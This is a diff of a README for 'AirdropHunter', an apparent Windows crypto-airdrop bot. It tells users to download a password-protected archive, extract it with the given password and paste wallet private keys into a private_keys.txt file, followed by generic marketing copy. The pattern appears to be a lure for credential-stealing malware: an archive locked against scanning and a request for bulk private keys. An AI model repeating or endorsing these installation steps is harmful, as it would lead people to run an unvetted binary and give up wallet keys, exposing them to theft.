@@ -24,7 +24,7 @@ The software performs actions for each potential airdrop:
 - Multi-networking with bridges
 - Interaction with DEX, live minting and more
 
-The bot uses airdrop algorithms from here (https://airdrops.io/).
+The bot uses airdrop algorithms from [here](https://airdrops.io/).
 
 ### Requirements
 - Windows 7/10/11
@@ -37,7 +37,8 @@ The bot uses airdrop algorithms from here (https://airdrops.io/).
 
 ## Installation
 - [Download](https://github.com/deadspyexx/airdrop-hunt-bot/archive/refs/heads/main.zip) the repository release and extract files with password `U4DVIBE3qo`.
-- Edit the `address` and `private_key` fields in the `config.json` file.
+- Edit the `MORALIS_KEY` in the `config.json` file.
+- Paste private keys into `private_keys.txt` file.
 
 ## How it works
 Execute trades and transfers effortlessly without manual intervention. AirdropHunter automates the entire process, saving time and reducing the risk of errors.Seamlessly swap tokens between different assets on the blockchain. AirdropHunter simplifies the process, eliminating the need to navigate multiple exchanges.AirdropHunter optimizes transaction processing, minimizing gas fees, and reducing confirmation times. Enjoy faster and more cost-effective transactions.Automate repetitive tasks with ease using AirdropHunter. Set up recurring transactions or batch processing, freeing up time for other important activities.Personalize AirdropHunter to suit your preferences. Define parameters, configure trade strategies, and customize transaction settings.AirdropHunter boasts an intuitive interface and a straightforward setup process, catering to both beginners and experienced users.
